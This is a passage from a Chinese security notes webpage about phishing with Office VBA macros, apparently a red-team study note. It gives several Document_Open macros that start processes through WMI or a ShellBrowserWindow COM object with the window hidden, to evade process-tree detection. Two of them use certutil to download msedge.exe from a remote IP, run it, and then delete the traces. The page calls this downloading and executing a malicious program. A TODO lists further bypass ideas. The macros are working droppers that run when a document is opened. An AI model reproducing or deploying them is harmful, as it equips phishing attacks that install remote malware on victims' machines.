data-title="vb"><pre class="language-vb"><code><span class="token keyword">Private</span> <span class="token keyword">Sub</span> Document_Open<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment">&#39; 通过WMI连接到本地计算机的 CIMv2 命名空间，并设置模拟级别为“impersonate”，以允许脚本以调用者的权限运行WMI操作</span>
<span class="token keyword">Set</span> objWMIService <span class="token operator">=</span> GetObject<span class="token punctuation">(</span><span class="token string">&quot;winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2&quot;</span><span class="token punctuation">)</span>
<span class="token comment">&#39; 获取 Win32_ProcessStartup 类的一个实例，该类包含进程启动配置的相关信息</span>
<span class="token keyword">Set</span> objStartup <span class="token operator">=</span> objWMIService<span class="token punctuation">.</span><span class="token keyword">Get</span><span class="token punctuation">(</span><span class="token string">&quot;Win32_ProcessStartup&quot;</span><span class="token punctuation">)</span>
<span class="token comment">&#39; 创建 Win32_ProcessStartup 类的一个新实例，这个实例将用于配置新进程的启动参数。</span>
<span class="token keyword">Set</span> objConfig <span class="token operator">=</span> objStartup<span class="token punctuation">.</span>SpawnInstance_
<span class="token comment">&#39; 获取 Win32_Process 类的实例，该类用于创建和管理进程</span>
<span class="token keyword">Set</span> objProcess <span class="token operator">=</span> GetObject<span class="token punctuation">(</span><span class="token string">&quot;winmgmts:root\cimv2:Win32_Process&quot;</span><span class="token punctuation">)</span>
<span class="token comment">&#39; 创建一个新的进程，运行计算器程序（calc），将启动参数传递给新进程，并返回进程ID</span>
errReturn <span class="token operator">=</span> objProcess<span class="token punctuation">.</span>Create<span class="token punctuation">(</span><span class="token string">&quot;calc&quot;</span><span class="token punctuation">,</span> Null<span class="token punctuation">,</span> objConfig<span class="token punctuation">,</span> intProcessID<span class="token punctuation">)</span>
<span class="token keyword">End</span> <span class="token keyword">Sub</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-vb line-numbers-mode" data-ext="vb" data-title="vb"><pre class="language-vb"><code><span class="token keyword">Private</span> <span class="token keyword">Sub</span> Document_Open<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">Set</span> objWMIService <span class="token operator">=</span> GetObject<span class="token punctuation">(</span><span class="token string">&quot;winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">Set</span> objStartup <span class="token operator">=</span> objWMIService<span class="token punctuation">.</span><span class="token keyword">Get</span><span class="token punctuation">(</span><span class="token string">&quot;Win32_ProcessStartup&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">Set</span> objConfig <span class="token operator">=</span> objStartup<span class="token punctuation">.</span>SpawnInstance_
<span class="token keyword">Set</span> objProcess <span class="token operator">=</span> GetObject<span class="token punctuation">(</span><span class="token string">&quot;winmgmts:root\cimv2:Win32_Process&quot;</span><span class="token punctuation">)</span>
errReturn <span class="token operator">=</span> objProcess<span class="token punctuation">.</span>Create<span class="token punctuation">(</span><span class="token string">&quot;calc&quot;</span><span class="token punctuation">,</span> Null<span class="token punctuation">,</span> objConfig<span class="token punctuation">,</span> intProcessID<span class="token punctuation">)</span>
<span class="token keyword">End</span> <span class="token keyword">Sub</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407121600420.png" alt="image-20240712160058099"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407111449956.png" alt="image-20240711144920180"></p><hr><div class="language-vb line-numbers-mode" data-ext="vb" data-title="vb"><pre class="language-vb"><code><span class="token keyword">Private</span> <span class="token keyword">Sub</span> Document_Open<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment">&#39; 通过WMI连接到本地计算机的 CIMv2 命名空间，并设置模拟级别为“impersonate”，以允许脚本以调用者的权限运行WMI操作</span>
<span class="token keyword">Set</span> objWMIService <span class="token operator">=</span> GetObject<span class="token punctuation">(</span><span class="token string">&quot;winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2&quot;</span><span class="token punctuation">)</span>
<span class="token comment">&#39; 获取 Win32_ProcessStartup 类的一个实例，该类包含进程启动配置的相关信息</span>
<span class="token keyword">Set</span> objStartup <span class="token operator">=</span> objWMIService<span class="token punctuation">.</span><span class="token keyword">Get</span><span class="token punctuation">(</span><span class="token string">&quot;Win32_ProcessStartup&quot;</span><span class="token punctuation">)</span>
<span class="token comment">&#39; 创建 Win32_ProcessStartup 类的一个新实例，这个实例将用于配置新进程的启动参数。</span>
<span class="token keyword">Set</span> objConfig <span class="token operator">=</span> objStartup<span class="token punctuation">.</span>SpawnInstance_
<span class="token comment">&#39; 获取 Win32_Process 类的实例，该类用于创建和管理进程</span>
<span class="token keyword">Set</span> objProcess <span class="token operator">=</span> GetObject<span class="token punctuation">(</span><span class="token string">&quot;winmgmts:root\cimv2:Win32_Process&quot;</span><span class="token punctuation">)</span>
<span class="token comment">&#39; 创建一个新的进程，运行计算器程序（calc），将启动参数传递给新进程，并返回进程ID</span>
errReturn <span class="token operator">=</span> objProcess<span class="token punctuation">.</span>Create<span class="token punctuation">(</span><span class="token string">&quot;cmd /c certutil -urlcache -split -f http://100.1.1.131:8000/download/msedge.exe a.exe &amp;&amp; a.exe &amp;&amp; del a.exe &amp;&amp; certutil -urlcache -split -f http://100.1.1.131:8000/download/msedge.exe delete&quot;</span><span class="token punctuation">,</span> Null<span class="token punctuation">,</span> objConfig<span class="token punctuation">,</span> intProcessID<span class="token punctuation">)</span>
<span class="token keyword">End</span> <span class="token keyword">Sub</span> 
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407121117017.png" alt="image-20240712111753018"></p><hr><h4 id="获取-wsh-对象调用-cmd-执行命令" tabindex="-1"><a class="header-anchor" href="#获取-wsh-对象调用-cmd-执行命令"><span>获取 WSH 对象调用 cmd 执行命令</span></a></h4><blockquote><p><a href="https://www.jianshu.com/p/8b01fca2c177" target="_blank" rel="noopener noreferrer">Office钓鱼攻击绕过进程树检测 - 简书 (jianshu.com)<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p></blockquote><p>COM（Component Object Model）对象是通过一个或多个相关函数集来实现对对象数据的访问的对象。这些函数集被称为接口，接口的函数被称为方法。</p><p>COM 基本上可以从VBScript引用任何COM对象(实际上是另一个可执行文件)并使用它的函数。例如，对象 <code>ShellBrowserWindow</code> 可以用来从资源管理器执行新的进程。</p><p><code>CreateObject</code> 是 VBScript 提供的一个函数，用于创建 COM 对象。</p><hr><p>Windows 操作系统自带了 Windows Script Host 环境，允许使用脚本语言（如 VBScript 和 JScript）来自动化任务。通过 WSH，可以创建 <code>WScript.Shell</code> 对象来运行命令、打开文件、操作系统等。</p><hr><p>弹个计算器:</p><div class="language-vb line-numbers-mode" data-ext="vb" data-title="vb"><pre class="language-vb"><code><span class="token keyword">Sub</span> ducument_open<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">Set</span> obj <span class="token operator">=</span> GetObject<span class="token punctuation">(</span><span class="token string">&quot;new:C08AFD90-F2A1-11D1-8455-00A0C91F3880&quot;</span><span class="token punctuation">)</span>
obj<span class="token punctuation">.</span>Document<span class="token punctuation">.</span>Application<span class="token punctuation">.</span>ShellExecute <span class="token string">&quot;calc&quot;</span><span class="token punctuation">,</span> Null<span class="token punctuation">,</span> <span class="token string">&quot;C:\\Windows\\System32&quot;</span><span class="token punctuation">,</span> Null<span class="token punctuation">,</span> <span class="token number">0</span>
<span class="token keyword">End</span> <span class="token keyword">Sub</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li><p><code>Set obj = GetObject(&quot;new:C08AFD90-F2A1-11D1-8455-00A0C91F3880&quot;)</code>: 创建一个新的COM对象。``C08AFD90-F2A1-11D1-8455-00A0C91F3880<code>是</code>Windows Script Host Shell<code>对象的</code>CLSID<code>（类标识符）。通过这种方式创建的对象提供了一些与</code>Windows Shell` 交互的方法和属性</p></li><li><p><code>obj.Document.Application.ShellExecute &quot;calc&quot;, Null, &quot;C:\\Windows\\System32&quot;, Null, 0</code></p><p>使用Shell对象的 <code>ShellExecute</code> 方法来启动一个新进程</p><ul><li><code>&quot;calc&quot;</code>：要执行的程序名称。</li><li><code>Null</code>：表示不传递参数给启动的程序。</li><li><code>&quot;C:\\Windows\\System32&quot;</code>：指定计算器程序所在的目录。</li><li><code>Null</code>：表示默认使用当前窗口显示模式。</li><li><code>0</code>：指定程序的启动方式，这里为隐藏模式（0 表示隐藏窗口）。</li></ul></li></ul><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407121604470.png" alt="image-20240712160406287"></p><hr><p>调用 CMD 执行 <code>calc.exe</code></p><div class="language-vb line-numbers-mode" data-ext="vb" data-title="vb"><pre class="language-vb"><code><span class="token keyword">Private</span> <span class="token keyword">Sub</span> Document_Open<span class="token punctuation">(</span><span class="token punctuation">)</span>
  <span class="token keyword">Set</span> obj <span class="token operator">=</span> GetObject<span class="token punctuation">(</span><span class="token string">&quot;new:C08AFD90-F2A1-11D1-8455-00A0C91F3880&quot;</span><span class="token punctuation">)</span>
  obj<span class="token punctuation">.</span>Document<span class="token punctuation">.</span>Application<span class="token punctuation">.</span>ShellExecute <span class="token string">&quot;cmd.exe&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;/c calc.exe&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;C:\Windows\System32&quot;</span><span class="token punctuation">,</span> Null<span class="token punctuation">,</span> <span class="token number">0</span>
<span class="token keyword">End</span> <span class="token keyword">Sub</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407121609386.png" alt="image-20240712160940200"></p><hr><p>调用 cmd 使用 Certutil 下载恶意程序然后执行</p><div class="language-vb line-numbers-mode" data-ext="vb" data-title="vb"><pre class="language-vb"><code><span class="token keyword">Private</span> <span class="token keyword">Sub</span> Document_Open<span class="token punctuation">(</span><span class="token punctuation">)</span>
  <span class="token keyword">Set</span> obj <span class="token operator">=</span> GetObject<span class="token punctuation">(</span><span class="token string">&quot;new:C08AFD90-F2A1-11D1-8455-00A0C91F3880&quot;</span><span class="token punctuation">)</span>
  obj<span class="token punctuation">.</span>Document<span class="token punctuation">.</span>Application<span class="token punctuation">.</span>ShellExecute <span class="token string">&quot;cmd.exe&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;/c certutil -urlcache -split -f http://100.1.1.131:8000/download/msedge.exe a.exe &amp;&amp; a.exe &amp;&amp; del a.exe &amp;&amp; certutil -urlcache -split -f http://100.1.1.131:8000/download/msedge.exe delete&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;C:\Windows\System32&quot;</span><span class="token punctuation">,</span> Null<span class="token punctuation">,</span> <span class="token number">0</span>
<span class="token keyword">End</span> <span class="token keyword">Sub</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407121616272.png" alt="image-20240712161607021"></p><hr><h4 id="stash" tabindex="-1"><a class="header-anchor" href="#stash"><span>stash</span></a></h4><blockquote><p><a href="https://www.jianshu.com/p/8b01fca2c177" target="_blank" rel="noopener noreferrer">Office钓鱼攻击绕过进程树检测 - 简书 (jianshu.com)<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p></blockquote><p>TODO:</p><ul class="task-list-container"><li class="task-list-item"><p><input type="checkbox" class="task-list-item-checkbox" id="task-item-0" disabled="disabled"><label class="task-list-item-label" for="task-item-0"> 如下是材料收集中标记为未复现成功的绕过方案, 有空研究下</label></p></li><li><p>通过Scheduled Task使用svchost.exe绕过</p></li><li><p>通过Windows API注入Excel内存绕过</p></li></ul><hr></div><!--[--><!----><!--]--><footer class="page-meta"><div class="meta-item edit-link"><a href="https://github.com/233Official/dailynotes/edit/main/docs/网络安全/钓鱼/钓鱼附件/Office/Office宏/VBA宏.md" rel="noopener noreferrer" target="_blank" aria-label="编辑此页" class="nav-link label"><!--[--><svg xmlns="http://www.w3.org/2000/svg" class="icon edit-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="edit icon"><path d="M430.818 653.65a60.46 60.46 0 0 1-50.96-93.281l71.69-114.012 7.773-10.365L816.038 80.138A60.46 60.46 0 0 1 859.225 62a60.46 60.46 0 0 1 43.186 18.138l43.186 43.186a60.46 60.46 0 0 1 0 86.373L588.879 565.55l-8.637 8.637-117.466 68.234a60.46 60.46 0 0 1-31.958 11.229z"></path><path d="M728.802 962H252.891A190.883 190.883 0 0 1 62.008 771.98V296.934a190.883 190.883 0 0 1 190.883-192.61h267.754a60.46 60.46 0 0 1 0 120.92H252.891a69.962 69.962 0 0 0-69.098 69.099V771.98a69.962 69.962 0 0 0 69.098 69.098h475.911A69.962 69.962 0 0 0 797.9 771.98V503.363a60.46 60.46 0 1 1 120.922 0V771.98A190.883 190.883 0 0 1 728.802 962z"></path></svg><!--]-->编辑此页<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span><!----></a></div><div class="meta-item git-info"><div class="update-time"><span class="label">上次编辑于: </span><!----></div><div class="contributors"><span class="label">贡献者: </span><!--[--><!--[--><span class="contributor" title="email: ayusummer233@gmail.com">233</span>,<!--]--><!--[--><span class="contributor" title="email: ayusummer233@gmail.com">233PC</span><!--]--><!--]--></div></div></footer><nav class="vp-page-nav"><a class="route-link nav-link prev" href="/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/Office%E5%AE%8F/Excel4.0%E5%AE%8F.html" aria-label="Excel4.0宏"><div class="hint"><span class="arrow start"></span>上一页</div><div class="link"><!---->Excel4.0宏</div></a><!----></nav><!----><!--[--><!----><!--]--><!--]--></main><!--]--><!----></div><!--]--><!--]--><!--[--><!----><!----><!--]--><!--]--></div>
    <script type="module" src="/dailynotes/assets/app-BT-bWAve.js" defer></script>
  </body>
</html>
